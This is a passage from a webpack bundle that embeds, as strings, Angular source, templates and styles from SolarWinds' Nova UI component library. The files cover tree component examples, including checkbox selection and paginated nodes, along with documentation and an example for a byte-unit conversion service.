"nui-tree-checkbox-test",\n    templateUrl: "./tree-checkbox-test.component.html",\n    styleUrls: ["./tree-checkbox-test.component.less"],\n    host: { id: "nui-tree-checkbox-example" },\n    animations: [expand],\n})\nexport class TreeCheckboxTestComponent {\n    public treeControl = new NestedTreeControl<FoodNode>(\n        (node) => node.children\n    );\n    public dataSource = new ArrayDataSource(TREE_DATA_CHECKBOX);\n    public selectionModel = new SelectionModel<FoodNode>(true);\n\n    public hasChild = (_: number, node: FoodNode): boolean =>\n        !!node.children?.length;\n\n    /** Whether all the descendants of the node are selected. */\n    public descendantsAllSelected(node: FoodNode): boolean {\n        const descendants = this.treeControl.getDescendants(node);\n        return (\n            descendants.length > 0 &&\n            descendants.every((child) => this.selectionModel.isSelected(child))\n        );\n    }\n\n    /** Whether part of the descendants are selected */\n    public descendantsPartiallySelected(node: FoodNode): boolean {\n        const descendants = this.treeControl.getDescendants(node);\n        const result = descendants.some((child) =>\n            this.selectionModel.isSelected(child)\n        );\n        return result && !this.descendantsAllSelected(node);\n    }\n\n    /** Toggle the branch selection. Select/deselect all the descendants node */\n    public branchItemSelectionToggle(node: FoodNode): void {\n        this.selectionModel.toggle(node);\n        const descendants = this.treeControl.getDescendants(node);\n        this.selectionModel.isSelected(node)\n            ? this.selectionModel.select(...descendants)\n            : this.selectionModel.deselect(...descendants);\n\n        // Force update for the parent\n        descendants.forEach((child) => this.selectionModel.isSelected(child));\n        this.checkAllParentsSelection(node);\n    }\n\n    /** Toggle a leaf item selection. Check all the parents to see if they changed */\n    public leafItemSelectionToggle(node: FoodNode): void {\n        this.selectionModel.toggle(node);\n        this.checkAllParentsSelection(node);\n    }\n\n    /** Checks all the parents when a leaf node is selected/unselected */\n    private checkAllParentsSelection(node: FoodNode): void {\n        let parent: FoodNode | undefined = this.getParentNode(node);\n        while (parent) {\n            this.checkRootNodeSelection(parent);\n            parent = this.getParentNode(parent);\n        }\n    }\n\n    /** Check root node checked state and change it accordingly */\n    private checkRootNodeSelection(node: FoodNode): void {\n        const nodeSelected = this.selectionModel.isSelected(node);\n        const descendants = this.treeControl.getDescendants(node);\n        const descAllSelected =\n            descendants.length > 0 &&\n            descendants.every((child) => this.selectionModel.isSelected(child));\n        if (nodeSelected && !descAllSelected) {\n            this.selectionModel.deselect(node);\n        } else if (!nodeSelected && descAllSelected) {\n            this.selectionModel.select(node);\n        }\n    }\n\n    /** Get the parent node of a node */\n    private getParentNode(node: FoodNode): FoodNode | undefined {\n        let parent: FoodNode | undefined;\n\n        // Don\'t need to get parent if node on the 0 level\n        if (TREE_DATA_CHECKBOX.find((n) => n === node)) {\n            return;\n        }\n\n        const search = (n: FoodNode): FoodNode | undefined => {\n            if (parent || !n.children) {\n                return;\n            }\n            if (n.children.find((i) => i === node)) {\n                parent = n;\n                return;\n            }\n            return n.children.find(search);\n        };\n\n        // invoke search on the level 0 items\n        TREE_DATA_CHECKBOX.forEach(search);\n\n        if (!parent) {\n            throw new Error("Parent wasn\'t found");\n        }\n\n        return parent;\n    }\n}\n'},89960:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<cdk-tree\n    [@.disabled]="true"\n    [dataSource]="dataSource"\n    [treeControl]="treeControl"\n>\n    <cdk-nested-tree-node *cdkTreeNodeDef="let node" class="nui-tree__leaf">\n        <button\n            nui-button\n            displayStyle="action"\n            type="button"\n            disabled\n        ></button>\n        {{ node.name }}, fromPage: {{ node.page }}\n    </cdk-nested-tree-node>\n    <cdk-nested-tree-node\n        #nestedNode="cdkNestedTreeNode"\n        *cdkTreeNodeDef="let node; when: hasChild"\n        class="nui-tree"\n    >\n        <div\n            class="nui-tree__header"\n            (click)="onToggleClick(node, nestedNode)"\n            cdkTreeNodeToggle\n        >\n            <nui-icon\n                class="nui-tree__header-icon"\n                icon="{{\n                    treeControl.isExpanded(node)\n                        ? \'triangle-down\'\n                        : \'triangle-right\'\n                }}"\n            ></nui-icon>\n            <span class="nui-tree__header-title">{{ node.name }}</span>\n        </div>\n        <div\n            class="nui-tree__body"\n            [class.nui-tree__body--collapsed]="!treeControl.isExpanded(node)"\n            [@expandedState]="\n                treeControl.isExpanded(node) ? \'expanded\' : \'collapsed\'\n            "\n        >\n            <div\n                nui-busy\n                [busy]="node.isLoading"\n                style="min-height: 20px"\n                (click)="$event.stopPropagation()"\n            >\n                <ng-container cdkTreeNodeOutlet></ng-container>\n                <nui-paginator\n                    *ngIf="node.hasPagination && nodesTotalItems[node.name]"\n                    [id]="\n                        \'nui-tree-paginator-component-\' +\n                        node.name.toLowerCase()\n                    "\n                    [page]="1"\n                    [pageSize]="pageSize"\n                    (pagerAction)="loadNodeItems(node, nestedNode, $event)"\n                    [total]="nodesTotalItems[node.name]"\n                >\n                </nui-paginator>\n            </div>\n        </div>\n    </cdk-nested-tree-node>\n</cdk-tree>\n'},94848:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "mixins/expander-base";\n\n.nui-tree {\n    .expander();\n\n    &__body {\n        &--collapsed {\n            overflow: hidden;\n        }\n    }\n\n    &__leaf {\n        display: flex;\n        align-items: center;\n    }\n\n    &__invisible {\n        display: none;\n    }\n\n    .content-container {\n        min-height: 20px;\n    }\n}\n'},72888:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ArrayDataSource } from "@angular/cdk/collections";\nimport {\n    CdkNestedTreeNode,\n    CdkTree,\n    NestedTreeControl,\n} from "@angular/cdk/tree";\nimport {\n    Component,\n    IterableDiffer,\n    IterableDiffers,\n    ViewChild,\n} from "@angular/core";\n\nimport { DOCUMENT_CLICK_EVENT, EventBusService, expand } from "@nova-ui/bits";\n\nimport { FoodNode, HttpMock, IApiResponse, TREE_DATA_PAGINATOR } from "../data";\n\n@Component({\n    selector: "nui-tree-paginator-test",\n    templateUrl: "./tree-paginator-test.component.html",\n    styleUrls: ["./tree-paginator-test.component.less"],\n    host: { id: "nui-tree-paginator-example" },\n    animations: [expand],\n    providers: [HttpMock],\n})\nexport class TreePaginatorTestComponent {\n    public pageSize = 10; // used for \'nui-paginator\'\n    public nodesTotalItems: { [key: string]: number } = {};\n\n    public treeControl = new NestedTreeControl<FoodNode>(\n        (node) => node.children\n    );\n    public dataSource = new ArrayDataSource(TREE_DATA_PAGINATOR);\n\n    @ViewChild(CdkTree) private cdkTree: CdkTree<FoodNode>;\n\n    hasChild = (_: number, node: FoodNode): boolean => !!node.children;\n\n    constructor(\n        private http: HttpMock,\n        private differ: IterableDiffers,\n        private eventBusService: EventBusService\n    ) {}\n\n    /** Load first page on first open */\n    public onToggleClick(\n        node: FoodNode,\n        nestedNode: CdkNestedTreeNode<any>\n    ): void {\n        this.eventBusService\n            .getStream(DOCUMENT_CLICK_EVENT)\n            .next(new MouseEvent("click"));\n\n        if (node.hasPagination && node.children && !node.children.length) {\n            const paginatorOptions = {\n                page: 1,\n                pageSize: this.pageSize,\n            };\n\n            this.loadNodeItems(node, nestedNode, paginatorOptions);\n        }\n    }\n\n    public loadNodeItems(\n        node: FoodNode,\n        nestedNodeDirective: CdkNestedTreeNode<any>,\n        paginatorOptions: any\n    ): void {\n        if (node.isLoading) {\n            return;\n        }\n\n        node.isLoading = true;\n\n        this.http\n            .getNodeItems(\n                node.name,\n                paginatorOptions.page,\n                paginatorOptions.pageSize\n            )\n            .subscribe((res: IApiResponse) => {\n                this.handleNodeTotalItems(node.name, res.total);\n                this.handleNodeContent(node, nestedNodeDirective, res.items);\n                node.isLoading = false;\n            });\n    }\n\n    private handleNodeTotalItems(nodeId: string, totalItems: number) {\n        this.nodesTotalItems[nodeId] = totalItems;\n    }\n\n    private handleNodeContent(\n        node: FoodNode,\n        nestedNodeDirective: CdkNestedTreeNode<any>,\n        items: FoodNode[]\n    ) {\n        node.children = [];\n        const differ: IterableDiffer<FoodNode> = this.differ\n            .find(node.children)\n            .create();\n        node.children = items;\n\n        // clear previously rendered leaf nodes\n        nestedNodeDirective.nodeOutlet.first.viewContainer.clear();\n        this.cdkTree.renderNodeChanges(\n            node.children,\n            differ,\n            nestedNodeDirective.nodeOutlet.first.viewContainer,\n            node\n        );\n    }\n}\n'},69383:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col">\n            <nui-tree-basic-test></nui-tree-basic-test>\n        </div>\n        <div class="col">\n            <nui-tree-checkbox-test></nui-tree-checkbox-test>\n        </div>\n        <div class="col">\n            <nui-tree-paginator-test></nui-tree-paginator-test>\n        </div>\n    </div>\n</div>\n'},73407:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tree-visual-test",\n    templateUrl: "./tree-visual-test.component.html",\n})\nexport class TreeVisualTestComponent {}\n'},42265:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div style="width: 360px">\n    <cdk-tree [dataSource]="dataSource" [treeControl]="treeControl">\n        <cdk-nested-tree-node *cdkTreeNodeDef="let node" class="nui-tree__leaf">\n            <button\n                nui-button\n                displayStyle="action"\n                type="button"\n                disabled\n            ></button>\n            <span class="nui-tree__leaf-title"> {{ node.name }} </span>\n            <nui-menu\n                icon="menu"\n                id="nui-demo-basic-menu"\n                [appendToBody]="true"\n                displayStyle="action"\n            >\n                <nui-menu-action *ngFor="let item of items">\n                    {{ item }}\n                </nui-menu-action>\n            </nui-menu>\n        </cdk-nested-tree-node>\n        <cdk-nested-tree-node\n            *cdkTreeNodeDef="let node; when: hasChild"\n            class="nui-tree"\n        >\n            <div\n                class="nui-tree__header"\n                cdkTreeNodeToggle\n                (click)="onToggleClick()"\n            >\n                <nui-icon\n                    class="nui-tree__header-icon"\n                    icon="{{\n                        treeControl.isExpanded(node)\n                            ? \'triangle-down\'\n                            : \'triangle-right\'\n                    }}"\n                ></nui-icon>\n                <span class="nui-tree__header-title">{{ node.name }}</span>\n                <div\n                    class="nui-badge-counter"\n                    [attr.data-before]="node.children.length"\n                ></div>\n            </div>\n            <div\n                class="nui-tree__body"\n                [class.nui-tree__body--collapsed]="\n                    !treeControl.isExpanded(node)\n                "\n                [@expandedState]="\n                    treeControl.isExpanded(node) ? \'expanded\' : \'collapsed\'\n                "\n            >\n                <ng-container cdkTreeNodeOutlet></ng-container>\n            </div>\n        </cdk-nested-tree-node>\n    </cdk-tree>\n</div>\n'},59525:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "mixins/expander-base";\n\n.nui-tree {\n    .expander();\n\n    &__header-title {\n        width: 100%;\n        line-height: 18px;\n    }\n\n    &__body {\n        &--collapsed {\n            overflow: hidden;\n        }\n    }\n\n    &__leaf {\n        display: flex;\n        align-items: center;\n\n        &-title {\n            width: 100%;\n        }\n    }\n\n    &__invisible {\n        display: none;\n    }\n\n    .nui-badge-counter {\n        position: relative;\n        height: 18px;\n\n        &:after {\n            background: #555;\n            width: 45px;\n            height: 18px;\n            line-height: 18px;\n            top: inherit;\n        }\n    }\n}\n'},12437:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ArrayDataSource } from "@angular/cdk/collections";\nimport { NestedTreeControl } from "@angular/cdk/tree";\nimport { Component } from "@angular/core";\n\nimport { DOCUMENT_CLICK_EVENT, EventBusService, expand } from "@nova-ui/bits";\n\ninterface FoodNode {\n    name: string;\n    children?: FoodNode[];\n}\n\nconst TREE_DATA: FoodNode[] = [\n    {\n        name: "Fruit",\n        children: [\n            { name: "Apple" },\n            { name: "Banana" },\n            { name: "Fruit loops" },\n        ],\n    },\n    {\n        name: "Vegetables",\n        children: [\n            {\n                name: "Green",\n                children: [{ name: "Broccoli" }, { name: "Brussels sprouts" }],\n            },\n            {\n                name: "Orange",\n                children: [{ name: "Pumpkins" }, { name: "Carrots" }],\n            },\n            {\n                name: "Red",\n            },\n        ],\n    },\n    {\n        name: "Meat",\n    },\n];\n\n@Component({\n    selector: "nui-tree-with-additional-content-example",\n    templateUrl: "tree-with-additional-content.example.component.html",\n    styleUrls: ["tree-with-additional-content.example.component.less"],\n    host: { id: "tree-with-additional-content-example" },\n    animations: [expand],\n})\nexport class TreeWithAdditionalContentExampleComponent {\n    treeControl = new NestedTreeControl<FoodNode>((node) => node.children);\n    dataSource = new ArrayDataSource(TREE_DATA);\n\n    public items = ["Item 1", "Item 2", "Item 3"];\n\n    public hasChild = (_: number, node: FoodNode): boolean =>\n        !!node.children?.length;\n\n    constructor(private eventBusService: EventBusService) {}\n\n    public onToggleClick(): void {\n        this.eventBusService\n            .getStream(DOCUMENT_CLICK_EVENT)\n            .next(new MouseEvent("click"));\n    }\n}\n'},63997:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { CdkTreeModule } from "@angular/cdk/tree";\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    NuiBusyModule,\n    NuiButtonModule,\n    NuiCheckboxModule,\n    NuiCommonModule,\n    NuiDialogModule,\n    NuiDocsModule,\n    NuiExpanderModule,\n    NuiIconModule,\n    NuiMenuModule,\n    NuiPaginatorModule,\n    NuiRepeatModule,\n    NuiSpinnerModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    TreeBasicExampleComponent,\n    TreeCheckboxExampleComponent,\n    TreeDialogContentExampleComponent,\n    TreeDocsExampleComponent,\n    TreeLazyExampleComponent,\n    TreeLeafPaginationExampleComponent,\n    TreeLoadMoreExampleComponent,\n    TreeShowAllDialogExampleComponent,\n    TreeStylingExampleComponent,\n    TreeVisualTestComponent,\n    TreeWithAdditionalContentExampleComponent,\n} from "./index";\nimport { TreeCheckboxLazyComponent } from "./tree-checkbox-lazy/tree-checkbox-lazy.component";\nimport { TreeBasicTestComponent } from "./tree-visual-test/tree-basic-test/tree-basic-test.component";\nimport { TreeCheckboxTestComponent } from "./tree-visual-test/tree-checkbox-test/tree-checkbox-test.component";\nimport { TreePaginatorTestComponent } from "./tree-visual-test/tree-paginator-test/tree-paginator-test.component";\n\nconst routes = [\n    {\n        path: "",\n        component: TreeDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "basic",\n        component: TreeBasicExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "lazy",\n        component: TreeLazyExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "leaf-pagination",\n        component: TreeLeafPaginationExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "show-all-dialog",\n        component: TreeShowAllDialogExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "styling",\n        component: TreeStylingExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "with-additional-content",\n        component: TreeWithAdditionalContentExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "checkbox",\n        component: TreeCheckboxExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "checkbox-lazy",\n        component: TreeCheckboxLazyComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "load-more",\n        component: TreeLoadMoreExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "tree-visual-test",\n        component: TreeVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        CdkTreeModule,\n        NuiDocsModule,\n        NuiCommonModule,\n        NuiIconModule,\n        NuiButtonModule,\n        NuiExpanderModule,\n        NuiButtonModule,\n        NuiMenuModule,\n        NuiSpinnerModule,\n        NuiCheckboxModule,\n        NuiPaginatorModule,\n        NuiDialogModule,\n        NuiRepeatModule,\n        NuiBusyModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        TreeBasicExampleComponent,\n        TreeDocsExampleComponent,\n        TreeStylingExampleComponent,\n        TreeVisualTestComponent,\n        TreeLazyExampleComponent,\n        TreeCheckboxExampleComponent,\n        TreeLeafPaginationExampleComponent,\n        TreeWithAdditionalContentExampleComponent,\n        TreeShowAllDialogExampleComponent,\n        TreeDialogContentExampleComponent,\n        TreeLoadMoreExampleComponent,\n        TreeBasicTestComponent,\n        TreeCheckboxTestComponent,\n        TreePaginatorTestComponent,\n        TreeCheckboxLazyComponent,\n    ],\n    exports: [RouterModule],\n})\nexport class TreeModule {}\n'},96414:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    The\n    <code\n        ><a\n            href="../injectables/UnitConversionService.html#info"\n            target="_parent"\n            >UnitConversionService</a\n        ></code\n    >\n    can be used to convert a large value of a small basic unit to a smaller\n    value of a larger unit\u2014for example, converting 1024 B (bytes) to 1 KB.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    There is also a\n    <code\n        ><a href="../pipes/UnitConversionPipe.html" target="_blank"\n            >unitConversion</a\n        ></code\n    >\n    pipe that makes use of this service. If your use case is a simple conversion\n    of a value within the context of a template, the pipe may offer a more\n    syntactically succinct method of conversion than using the methods of this\n    service directly.\n</nui-message>\n\n<h2>Basic Usage</h2>\n<p>\n    To convert a value, use the service\'s\n    <code\n        ><a\n            href="../injectables/UnitConversionService.html#info"\n            target="_parent"\n            >convert</a\n        ></code\n    >\n    method which accepts three arguments:\n</p>\n\n<ul>\n    <li><strong>value</strong> - The number to be converted</li>\n    <li>\n        <strong>base</strong> - An optional base value to use for the\n        exponential expression when calculating the conversion result (defaults\n        to\n        <code\n            ><a\n                href="../miscellaneous/enumerations.html#UnitBase"\n                target="_blank"\n                >UnitBase.Standard</a\n            ></code\n        >, or 1000)\n    </li>\n    <li>\n        <strong>scale</strong> - An optional scale value for specifying how many\n        significant digits to the right of the decimal to preserve in the output\n        (defaults to <code>1</code>).\n    </li>\n</ul>\n<p>\n    The result of the conversion is of type\n    <code\n        ><a href="../interfaces/IUnitConversionResult.html" target="_blank"\n            >IUnitConversionResult</a\n        ></code\n    >.\n</p>\n<nui-message type="warning" [allowDismiss]="false">\n    <strong>Note:</strong> For converting a value in bytes, be sure to specify\n    <code\n        ><a href="../miscellaneous/enumerations.html#UnitBase" target="_blank"\n            >UnitBase.Bytes</a\n        ></code\n    >, or 1024, for the convert method\'s base parameter.\n</nui-message>\n<p>\n    Once the conversion has been calculated, the result can be converted to a\n    display string that includes both the value and the unit. This can be done\n    via the\n    <code\n        ><a\n            href="../injectables/UnitConversionService.html#info"\n            target="_parent"\n            >getFullDisplay</a\n        ></code\n    >\n    method. Supported basic units are of type\n    <code\n        ><a href="../miscellaneous/typealiases.html#UnitOption" target="_blank"\n            >UnitOption</a\n        ></code\n    >\n    and include the following: <code>"generic"</code> (e.g. 1K for 1000),\n    <code>"bytes"</code>, <code>"bytesPerSecond"</code>,\n    <code>"bitsPerSecond"</code>, and <code>"hertz"</code>.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    The <code>getFullDisplay</code> method will localize the output for all\n    supported units except for the "generic" unit. Localization for the\n    "generic" unit is not yet supported.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="unit-conversion-service-basic"\n    exampleTitle="Basic Usage"\n>\n    <unit-conversion-service-basic-example></unit-conversion-service-basic-example>\n</nui-example-wrapper>\n\n<h2>Separating the Value and Unit for Display</h2>\n<p>\n    The display strings for the value and unit can also be determined separately\n    for situations in which you\'d like to display the conversion data in\n    separate elements on the page. To get just the converted value for display,\n    use the\n    <code\n        ><a\n            href="../injectables/UnitConversionService.html#info"\n            target="_parent"\n            >getValueDisplay</a\n        ></code\n    >\n    method, and to get just the converted unit for display, use the\n    <code\n        ><a\n            href="../injectables/UnitConversionService.html#info"\n            target="_parent"\n            >getUnitDisplay</a\n        ></code\n    >\n    method. If you need to convert the value into scientific notation use the\n    <code\n        ><a\n            href="../injectables/UnitConversionService.html#info"\n            target="_parent"\n            >getScientificDisplay</a\n        ></code\n    >\n    instead.\n</p>\n<nui-message type="warning" [allowDismiss]="false">\n    <strong>Note:</strong> The <code>getValueDisplay</code> method offers a\n    <code>localize</code> parameter which defaults to <code>true</code>.\n    However, if you\'re using the "generic" unit type, it\'s recommended to set\n    this argument to <code>false</code> as localization is not yet supported for\n    the "generic" unit.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="unit-conversion-service-separate-unit-display"\n    exampleTitle="Separating the Value and Unit for Display"\n>\n    <unit-conversion-service-separate-unit-display-example></unit-conversion-service-separate-unit-display-example>\n</nui-example-wrapper>\n'},51758:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="ul {\n    padding-left: 40px;\n\n    li {\n        list-style: disc;\n    }\n}\n"},18618:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    templateUrl: "./unit-conversion-service-docs.component.html",\n    styleUrls: ["./unit-conversion-service-docs.component.less"],\n})\nexport class UnitConversionServiceDocsComponent {}\n'},83080:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="conversion d-flex flex-column align-items-end">\n    {{ conversionDisplay }}\n</div>\n<hr />\n<nui-form-field\n    class="d-block mt-5"\n    caption="Bytes"\n    i18n-caption\n    [showOptionalText]="false"\n>\n    <nui-textbox-number\n        type="number"\n        [ngModel]="num"\n        (ngModelChange)="onNumberChange($event)"\n        [minValue]="0"\n        [step]="10"\n        customBoxWidth="200px"\n    ></nui-textbox-number>\n</nui-form-field>\n'},87968:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".conversion {\n    font-size: 25px;\n    width: 140px;\n}\n"},31512:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\n\nimport {\n    IUnitConversionResult,\n    UnitBase,\n    UnitConversionService,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "unit-conversion-service-basic-example",\n    templateUrl: "./unit-conversion-service-basic.example.component.html",\n    styleUrls: ["./unit-conversion-service-basic.example.component.less"],\n})\nexport class UnitConversionServiceBasicExampleComponent implements OnInit {\n    constructor(public unitConversionService: UnitConversionService) {}\n\n    public num: number;\n    public conversionDisplay: string;\n\n    public ngOnInit(): void {\n        this.onNumberChange(110000);\n    }\n\n    public onNumberChange(num: number): void {\n        this.num = num;\n        const conversionResult: IUnitConversionResult =\n            this.unitConversionService.convert(this.num, UnitBase.Bytes, 2);\n        this.conversionDisplay = this.unitConversionService.getFullDisplay(\n            conversionResult,\n            "bytes"\n        );\n    }\n}\n'},37934:(o,n,e)=>{"use 